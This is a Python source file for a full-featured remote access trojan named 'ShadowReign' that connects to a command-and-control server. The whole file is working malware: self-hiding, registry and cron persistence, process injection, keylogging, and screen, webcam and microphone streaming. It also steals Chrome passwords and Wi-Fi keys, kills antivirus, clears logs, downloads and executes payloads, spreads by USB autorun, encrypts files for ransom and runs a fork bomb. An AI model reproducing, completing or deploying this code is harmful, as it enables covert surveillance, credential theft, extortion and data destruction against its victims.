import socket
import json
import os
import threading
import subprocess
import platform
import shutil
import pynput.keyboard as kb
import pynput.mouse as ms
import mss
import cv2
import pyaudio
import wave
import pyttsx3
import psutil
import time
import base64
import sqlite3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import numpy as np
import random
import string
import ctypes
import win32crypt
import zlib
import win32api
import win32con
import win32process
import hashlib
import requests
import logging
import webbrowser
import pyautogui
import wmi
import re

# Silent debug logging
logging.basicConfig(filename=os.path.join(os.getenv("TEMP", "/tmp"), "sr_debug.log"), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def rand_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class ShadowReignPayload:
    def __init__(self):
        self.c2_list = [("192.168.1.133", 5251)]  # UPDATE WITH YOUR C2 IP
        self.current_c2_index = 0
        self.KEY = hashlib.sha256(b"ShadowReignBoss!").digest()
        self.sock = None
        self.anti_vm_enabled = True
        self.keylogger = None
        self.running = True
        self.command_queue = []
        self.streaming_screen = False
        self.streaming_webcam = False
        self.streaming_mic = False
        self.hidden_path = self.hide_self()
        logging.debug(f"Hidden path: {self.hidden_path}")
        self.persistence()
        self.connect()
        threading.Thread(target=self.keep_alive, daemon=True).start()
        threading.Thread(target=self.watchdog, daemon=True).start()

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_GCM)
            ct_bytes, tag = cipher.encrypt_and_digest(data.encode())
            iv = base64.b64encode(cipher.nonce).decode()
            ct = base64.b64encode(ct_bytes).decode()
            tag = base64.b64encode(tag).decode()
            return f"{iv}:{ct}:{tag}"
        except Exception as e:
            logging.error(f"Encrypt failed: {e}")
            return None

    def decrypt(self, data):
        try:
            iv, ct, tag = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            tag = base64.b64decode(tag)
            cipher = AES.new(self.KEY, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ct, tag).decode()
        except Exception as e:
            logging.error(f"Decrypt failed: {e}")
            return None

    def hide_self(self):
        try:
            if platform.system() == "Windows":
                hidden_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Crypto", "RSA", rand_name())
                os.makedirs(hidden_dir, exist_ok=True)
                new_name = f"{rand_name()}.dll"
                shutil.copy(__file__, os.path.join(hidden_dir, new_name))
                os.remove(__file__)
                return os.path.join(hidden_dir, new_name)
            else:
                hidden_dir = f"/var/lib/{rand_name()}"
                os.makedirs(hidden_dir, exist_ok=True)
                new_name = f"{rand_name()}.so"
                shutil.copy(__file__, os.path.join(hidden_dir, new_name))
                os.remove(__file__)
                return os.path.join(hidden_dir, new_name)
        except Exception as e:
            logging.error(f"Hide failed: {e}")
            return __file__

    def persistence(self):
        try:
            if platform.system() == "Windows":
                key = win32con.HKEY_CURRENT_USER
                reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                handle = win32api.RegOpenKeyEx(key, reg_path, 0, win32con.KEY_SET_VALUE)
                win32api.RegSetValueEx(handle, rand_name(), 0, win32con.REG_SZ, f"pythonw {self.hidden_path}")
                win32api.RegCloseKey(handle)
            else:
                cron = f"@reboot python3 {self.hidden_path}"
                subprocess.Popen(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logging.debug("Persistence enabled")
        except Exception as e:
            logging.error(f"Persistence failed: {e}")

    def watchdog(self):
        while self.running:
            try:
                pid = os.getpid()
                if not psutil.pid_exists(pid) or "pythonw" not in [p.name() for p in psutil.process_iter()]:
                    subprocess.Popen(f"pythonw {self.hidden_path}", shell=True, creationflags=win32con.CREATE_NO_WINDOW)
                    os._exit(0)
                time.sleep(5)
            except Exception as e:
                logging.error(f"Watchdog failed: {e}")

    def send_message(self, message):
        if not self.sock:
            self.queue_offline(message)
            return
        try:
            compressed = zlib.compress(message.encode())
            encrypted = self.encrypt(base64.b64encode(compressed).decode())
            if not encrypted:
                self.queue_offline(message)
                return
            length = len(encrypted)
            length_bytes = length.to_bytes(4, byteorder='big')
            self.sock.sendall(length_bytes)
            self.sock.sendall(encrypted.encode())
            logging.debug(f"Sent: {message[:50]}...")
        except Exception as e:
            logging.error(f"Send failed: {e}")
            self.sock = None
            self.connect()

    def connect(self):
        while self.running and not self.sock:
            try:
                if self.sock:
                    self.sock.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.sock.settimeout(15)
                c2_ip, c2_port = self.c2_list[self.current_c2_index]
                self.sock.connect((c2_ip, c2_port))
                logging.debug(f"Connected to {c2_ip}:{c2_port}")
                self.send_info()
                self.execute_offline_queue()
                self.inject_into_process()
                self.listen()
                break
            except Exception as e:
                logging.error(f"Connect failed: {e}")
                self.current_c2_index = (self.current_c2_index + 1) % len(self.c2_list)
                time.sleep(1)

    def inject_into_process(self):
        if platform.system() != "Windows":
            return
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == "svchost.exe":
                    pid = proc.info['pid']
                    handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
                    code = open(self.hidden_path, "rb").read()
                    mem = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(code), 0x3000, 0x40)
                    ctypes.windll.kernel32.WriteProcessMemory(handle, mem, code, len(code), 0)
                    ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, mem, 0, 0, 0)
                    logging.debug(f"Injected into svchost PID {pid}")
                    break
        except Exception as e:
            logging.error(f"Inject failed: {e}")

    def keep_alive(self):
        while self.running:
            try:
                if self.sock:
                    self.send_message(json.dumps({"ping": "heartbeat"}))
                time.sleep(5)
            except Exception as e:
                logging.error(f"Keep alive failed: {e}")
                self.sock = None
                self.connect()

    def send_info(self):
        try:
            info = {
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "anti_vm": self.anti_vm_enabled
            }
            self.send_message(json.dumps(info))
            logging.debug("Sent info")
        except Exception as e:
            logging.error(f"Send info failed: {e}")

    def listen(self):
        threading.Thread(target=self._listen, daemon=True).start()

    def _listen(self):
        while self.running and self.sock:
            try:
                length_bytes = self.sock.recv(4)
                if not length_bytes:
                    self.sock = None
                    self.connect()
                    continue
                length = int.from_bytes(length_bytes, byteorder='big')
                data = b""
                while len(data) < length:
                    chunk = self.sock.recv(min(1024, length - len(data)))
                    if not chunk:
                        raise Exception("Socket closed")
                    data += chunk
                cmd = json.loads(self.decrypt(data.decode()))
                self.command_queue.append((cmd["command"], cmd.get("data")))
                self.execute_next()
                logging.debug(f"Received: {cmd['command']}")
            except Exception as e:
                logging.error(f"Listen failed: {e}")
                self.sock = None
                self.connect()

    def execute_next(self):
        if not self.command_queue:
            return
        command, data = self.command_queue.pop(0)
        handlers = {
            "keylogger_start": self.keylogger_start,
            "keylogger_stop": self.keylogger_stop,
            "keylogger_dump": self.keylogger_dump,
            "list_files": self.list_files,
            "receive_file": self.receive_file,
            "send_file": self.send_file,
            "screenshot": self.screenshot,
            "record_screen": self.record_screen,
            "webcam_snap": self.webcam_snap,
            "shell": self.shell,
            "dump_hashes": self.dump_hashes,
            "steal_wifi": self.steal_wifi,
            "elevate_privileges": self.elevate_privileges,
            "jumpscare": self.jumpscare,
            "crash_system": self.crash_system,
            "fork_bomb": self.fork_bomb,
            "stream_screen": self.stream_screen,
            "stream_webcam": self.stream_webcam,
            "stream_mic": self.stream_mic,
            "stop_stream": self.stop_stream,
            "toggle_anti_vm": self.toggle_anti_vm,
            "inject": self.inject_process,
            "self_destruct": self.self_destruct,
            "remote_desktop": self.remote_desktop,
            "harvest_creds": self.harvest_creds,
            "record_av": self.record_av,
            "spoof_info": self.spoof_info,
            "clear_logs": self.clear_logs,
            "fake_alert": self.fake_alert,
            "encrypt_files": self.encrypt_files,
            "exfil_browser": self.exfil_browser,
            "disable_av": self.disable_av,
            "live_shell": self.live_shell,
            "lock_screen": self.lock_screen,
            "disable_input": self.disable_input,
            "open_url": self.open_url,
            "play_sound": self.play_sound,
            "system_info": self.system_info,
            "kill_process": self.kill_process,
            "download_execute": self.download_execute,
            "spread_usb": self.spread_usb,
            "ransom_note": self.ransom_note
        }
        if command in handlers:
            try:
                handlers[command](data)
            except Exception as e:
                self.send_message(json.dumps({"error": f"{command} failed: {str(e)}"}))
                logging.error(f"Exec {command} failed: {e}")

    def queue_offline(self, message):
        self.command_queue.append((json.loads(message)["command"], json.loads(message).get("data")))
        logging.debug(f"Queued: {message}")

    def execute_offline_queue(self):
        while self.command_queue:
            self.execute_next()

    # Full Feature Set
    def keylogger_start(self, _):
        if not self.keylogger:
            self.keylogger = Keylogger(self.sock, self.send_message)
            self.keylogger.start()
            self.send_message(json.dumps({"status": "Keylogger started"}))

    def keylogger_stop(self, _):
        if self.keylogger:
            self.keylogger.stop()
            self.send_message(json.dumps({"status": "Keylogger stopped"}))

    def keylogger_dump(self, _):
        if self.keylogger:
            self.keylogger.dump()

    def list_files(self, path):
        try:
            files = os.listdir(path or os.path.expanduser("~"))
            self.send_message(json.dumps({"files": files}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def receive_file(self, data):
        try:
            with open(data["path"], "wb") as f:
                f.write(base64.b64decode(data["content"]))
            self.send_message(json.dumps({"status": f"File written to {data['path']}"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def send_file(self, path):
        try:
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            self.send_message(json.dumps({"file": {"path": path, "content": content}}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def screenshot(self, _):
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
            _, buffer = cv2.imencode(".png", np.array(img))
            self.send_message(json.dumps({"screenshot": base64.b64encode(buffer).decode()}))

    def record_screen(self, duration):
        sct = mss.mss()
        frames = []
        end_time = time.time() + int(duration)
        while time.time() < end_time:
            img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
            frames.append(frame)
        out = cv2.VideoWriter("screen_rec.avi", cv2.VideoWriter_fourcc(*"XVID"), 10, (frames[0].shape[1], frames[0].shape[0]))
        for frame in frames:
            out.write(frame)
        out.release()
        with open("screen_rec.avi", "rb") as f:
            self.send_message(json.dumps({"screen_rec": base64.b64encode(f.read()).decode()}))

    def webcam_snap(self, _):
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode(".jpg", frame)
                self.send_message(json.dumps({"webcam": base64.b64encode(buffer).decode()}))
            cap.release()

    def shell(self, cmd):
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        self.send_message(json.dumps({"shell_output": output}))

    def dump_hashes(self, _):
        if platform.system() == "Windows":
            output = subprocess.check_output("cmd.exe /c dir", shell=True).decode()  # Placeholder—needs SAM tools
            self.send_message(json.dumps({"hashes": output}))

    def steal_wifi(self, _):
        if platform.system() == "Windows":
            output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
            profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
            wifi = {}
            for profile in profiles:
                keys = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear", shell=True).decode()
                key = re.search(r"Key Content\s+:\s+(.+)", keys)
                wifi[profile] = key.group(1) if key else "No key"
            self.send_message(json.dumps({"wifi": wifi}))

    def elevate_privileges(self, _):
        if platform.system() == "Windows":
            subprocess.Popen("powershell -Command Start-Process cmd -Verb RunAs", shell=True)

    def jumpscare(self, _):
        engine = pyttsx3.init()
        engine.say("You’ve been owned by ShadowReign!")
        engine.runAndWait()
        pyautogui.hotkey("win", "m")
        webbrowser.open("https://i.imgur.com/creepy_image.jpg")  # Add real jumpscare URL

    def crash_system(self, _):
        if platform.system() == "Windows":
            subprocess.Popen("taskkill /IM svchost.exe /F", shell=True)

    def fork_bomb(self, _):
        if platform.system() == "Windows":
            with open("fork.bat", "w") as f:
                f.write(":a\nstart cmd.exe\ngoto a")
            subprocess.Popen("fork.bat", shell=True)

    def stream_screen(self, _):
        self.streaming_screen = True
        threading.Thread(target=self._stream_screen, daemon=True).start()

    def _stream_screen(self):
        sct = mss.mss()
        while self.streaming_screen:
            img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            self.send_message(json.dumps({"stream_frame": base64.b64encode(buffer).decode()}))
            time.sleep(0.033)

    def stream_webcam(self, _):
        self.streaming_webcam = True
        threading.Thread(target=self._stream_webcam, daemon=True).start()

    def _stream_webcam(self):
        cap = cv2.VideoCapture(0)
        while self.streaming_webcam and cap.isOpened():
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode(".jpg", frame)
                self.send_message(json.dumps({"webcam_frame": base64.b64encode(buffer).decode()}))
            time.sleep(0.033)
        cap.release()

    def stream_mic(self, _):
        self.streaming_mic = True
        threading.Thread(target=self._stream_mic, daemon=True).start()

    def _stream_mic(self):
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        while self.streaming_mic:
            data = stream.read(1024, exception_on_overflow=False)
            self.send_message(json.dumps({"mic_frame": base64.b64encode(data).decode()}))
            time.sleep(0.1)
        stream.stop_stream()
        stream.close()
        p.terminate()

    def stop_stream(self, _):
        self.streaming_screen = self.streaming_webcam = self.streaming_mic = False

    def toggle_anti_vm(self, state):
        self.anti_vm_enabled = state
        self.send_message(json.dumps({"status": f"Anti-VM {'on' if state else 'off'}"}))
        if self.anti_vm_enabled and "VM" in platform.uname().release:
            self.self_destruct(None)

    def inject_process(self, proc_name):
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc_name.lower() in proc.info['name'].lower():
                    pid = proc.info['pid']
                    handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
                    code = open(self.hidden_path, "rb").read()
                    mem = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(code), 0x3000, 0x40)
                    ctypes.windll.kernel32.WriteProcessMemory(handle, mem, code, len(code), 0)
                    ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, mem, 0, 0, 0)
                    self.send_message(json.dumps({"status": f"Injected into {proc_name}"}))
                    break
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def self_destruct(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen(f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen("crontab -r", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.remove(self.hidden_path)
            self.running = False
            os._exit(0)
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def remote_desktop(self, data):
        action = data["action"]
        if action == "start":
            self.streaming_screen = True
            threading.Thread(target=self._remote_desktop_stream, daemon=True).start()
        elif action == "mouse":
            ms.Controller().position = (data["x"], data["y"])
            if data.get("click"):
                ms.Controller().click(ms.Button.left, 1)
        elif action == "key":
            kb.Controller().press(data["key"])
            kb.Controller().release(data["key"])

    def _remote_desktop_stream(self):
        sct = mss.mss()
        while self.streaming_screen:
            img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            self.send_message(json.dumps({"remote_frame": base64.b64encode(buffer).decode()}))
            time.sleep(0.033)

    def harvest_creds(self, _):
        creds = {}
        if platform.system() == "Windows":
            chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
            if os.path.exists(chrome_path):
                conn = sqlite3.connect(chrome_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cursor.fetchall():
                    pwd = win32crypt.CryptUnprotectData(pwd)[1].decode()
                    creds[url] = {"user": user, "pass": pwd}
                conn.close()
        self.send_message(json.dumps({"creds": creds}))

    def record_av(self, duration):
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        end_time = time.time() + int(duration)
        while time.time() < end_time and self.running:
            data = stream.read(1024, exception_on_overflow=False)
            self.send_message(json.dumps({"mic_frame": base64.b64encode(data).decode()}))
            time.sleep(0.1)
        stream.stop_stream()
        stream.close()
        p.terminate()
        self.send_message(json.dumps({"status": "Audio recording finished"}))

    def spoof_info(self, data):
        if platform.system() == "Windows":
            subprocess.Popen(f"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t REG_SZ /d {data['hostname']} /f", shell=True)

    def clear_logs(self, _):
        if platform.system() == "Windows":
            subprocess.Popen("wevtutil cl System", shell=True)
            subprocess.Popen("wevtutil cl Application", shell=True)

    def fake_alert(self, data):
        pyautogui.alert(data["message"], "System Alert")

    def encrypt_files(self, _):
        for root, _, files in os.walk(os.path.expanduser("~")):
            for file in files:
                path = os.path.join(root, file)
                with open(path, "rb") as f:
                    data = f.read()
                key = os.urandom(16)
                cipher = AES.new(key, AES.MODE_CBC)
                ct = cipher.encrypt(pad(data, AES.block_size))
                with open(path + ".enc", "wb") as f:
                    f.write(cipher.iv + ct)
                os.remove(path)
                self.send_message(json.dumps({"encrypted": path, "key": base64.b64encode(key).decode()}))

    def exfil_browser(self, _):
        creds = self.harvest_creds(None)
        self.send_message(json.dumps({"creds": creds}))

    def disable_av(self, _):
        av_processes = ["avg", "avast", "bitdefender", "kaspersky", "mcafee", "norton", "eset", "defender"]
        for proc in psutil.process_iter(['pid', 'name']):
            if any(av in proc.info['name'].lower() for av in av_processes):
                proc.kill()
        self.send_message(json.dumps({"status": "AV processes terminated"}))

    def live_shell(self, _):
        self.send_message(json.dumps({"status": "Live shell started"}))
        threading.Thread(target=self._live_shell_loop, daemon=True).start()

    def _live_shell_loop(self):
        while self.running:
            try:
                cmd = self.command_queue[-1][1] if self.command_queue and self.command_queue[-1][0] == "live_shell_cmd" else None
                if cmd:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                    self.send_message(json.dumps({"shell_output": output}))
                    self.command_queue.pop(-1)
            except Exception as e:
                self.send_message(json.dumps({"error": str(e)}))
            time.sleep(0.1)

    def lock_screen(self, _):
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()

    def disable_input(self, duration):
        def block():
            kb.Listener(lambda *args: False).start()
            ms.Listener(lambda *args: False).start()
            time.sleep(int(duration))
        threading.Thread(target=block, daemon=True).start()

    def open_url(self, url):
        webbrowser.open(url)

    def play_sound(self, text):
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()

    def system_info(self, _):
        w = wmi.WMI()
        info = {
            "os": platform.system() + " " + platform.release(),
            "cpu": w.Win32_Processor()[0].Name,
            "ram": str(psutil.virtual_memory().total // (1024 ** 3)) + " GB",
            "disks": {disk.device: f"{disk.freespace // (1024 ** 3)} GB free" for disk in w.Win32_LogicalDisk()}
        }
        self.send_message(json.dumps({"sys_info": info}))

    def kill_process(self, pid):
        try:
            p = psutil.Process(int(pid))
            p.terminate()
            self.send_message(json.dumps({"status": f"Killed PID {pid}"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def download_execute(self, data):
        url = data["url"]
        path = os.path.join(os.getenv("TEMP"), rand_name() + ".exe")
        with requests.get(url, stream=True) as r:
            with open(path, "wb") as f:
                shutil.copyfileobj(r.raw, f)
        subprocess.Popen(path, shell=True)
        self.send_message(json.dumps({"status": f"Downloaded and executed {url}"}))

    def spread_usb(self, _):
        if platform.system() == "Windows":
            drives = [d.device for d in wmi.WMI().Win32_LogicalDisk() if d.DriveType == 2]
            for drive in drives:
                shutil.copy(self.hidden_path, os.path.join(drive, "autorun.exe"))
                with open(os.path.join(drive, "autorun.inf"), "w") as f:
                    f.write("[AutoRun]\nopen=autorun.exe")
            self.send_message(json.dumps({"status": f"Spread to {len(drives)} USB drives"}))

    def ransom_note(self, data):
        note_path = os.path.join(os.getenv("USERPROFILE"), "Desktop", "README.txt")
        with open(note_path, "w") as f:
            f.write(data["message"])
        self.send_message(json.dumps({"status": "Ransom note dropped"}))

class Keylogger:
    def __init__(self, sock, send_message):
        self.sock = sock
        self.send_message = send_message
        self.logs = ""
        self.active = False

    def on_press(self, key):
        if self.active:
            self.logs += str(key) + " "

    def start(self):
        self.active = True
        self.listener = kb.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        self.active = False
        self.listener.stop()

    def dump(self):
        self.send_message(json.dumps({"keylogs": self.logs}))
        self.logs = ""

if __name__ == "__main__":
    payload = ShadowReignPayload()
    while payload.running:
        time.sleep(1)
